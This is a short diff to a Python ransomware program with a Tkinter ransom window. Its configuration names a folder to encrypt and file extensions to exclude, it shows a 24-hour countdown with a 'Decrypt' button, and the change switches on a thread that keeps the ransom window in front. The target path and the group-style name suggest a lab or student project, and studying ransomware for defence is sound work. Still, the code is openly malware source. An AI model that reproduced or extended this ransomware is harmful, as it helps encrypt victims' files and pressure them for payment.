@@ -18,9 +18,9 @@ from PIL import ImageTk, Image
 #################################################     INITIALIZATIONS     #################################################
 ###########################################################################################################################
 
-ENCRYPT_FOLDER_PATH = '/home/victim/Desktop/TestFolder/'  # CHANGE THIS
+ENCRYPT_FOLDER_PATH = '/home/aleix/Desktop/TestFolder/'  # CHANGE THIS
 EXCLUDED_EXTENSIONS = ['.py', '.pem', '.exe']  # CHANGE THIS
-RANWOMWARE_WINDOW_NAME = 'GЯ0up7 Ransomware'  # CHANGE THIS
+RANWOMWARE_WINDOW_NAME = 'GR0up7 Ransomware'  # CHANGE THIS
 
 ###########################################################################################################################
 
@@ -67,13 +67,12 @@ class GUI(Thread):
         
         
         decrypt_button = tk.Button(self.root, text='Decrypt', width=20, height=10, command=self.decryption_traversal)
-        # decrypt_button = tk.Button(self.root, text='Decrypt', command=lambda: decryption_traversal(self.root))
         decrypt_button.pack(padx=10, pady=10)
 
         # call countdown first time
         self.countdown('23:59:59')
 
-        # Thread(target=keep_active_window, daemon=True).start()
+        Thread(target=keep_active_window, daemon=True).start()
 
         self.root.mainloop()
 
